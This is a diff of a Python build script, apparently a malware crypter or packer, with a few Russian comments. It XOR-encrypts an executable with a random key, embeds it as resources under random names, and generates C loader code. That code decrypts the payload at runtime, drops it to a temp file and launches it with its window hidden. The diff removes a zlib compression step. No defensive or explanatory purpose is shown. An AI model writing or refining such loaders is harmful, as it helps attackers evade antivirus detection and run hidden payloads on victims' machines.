@@ -3,7 +3,6 @@ import sys
 import subprocess
 import random
 import string
-import zlib
 
 def generate_random_name():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
@@ -25,13 +24,10 @@ def build_single_exe_with_dll(exe_path):
     
     print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
     
-    print("Processing...")
-    compressed = zlib.compress(exe_data, level=9)
-    
-    print("Encrypting...")
+    print("Encrypting with XOR...")
     key = os.urandom(32)
     encrypted = bytearray()
-    for i, byte in enumerate(compressed):
+    for i, byte in enumerate(exe_data):
         encrypted.append(byte ^ key[i % len(key)])
     
     name1 = generate_random_name()
@@ -97,6 +93,7 @@ void proc2() {{
     DWORD s2 = SizeofResource(h, r2);
     unsigned char* d2 = (unsigned char*)LockResource(g2);
     
+    // Расшифровываем XOR
     unsigned char* out = (unsigned char*)malloc(s1);
     if (!out) return;
     memcpy(out, d1, s1);
@@ -125,7 +122,6 @@ void proc2() {{
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
         
-        // УБИРАЕМ CREATE_NO_WINDOW - это блокирует UAC!
         CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
                        NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
         
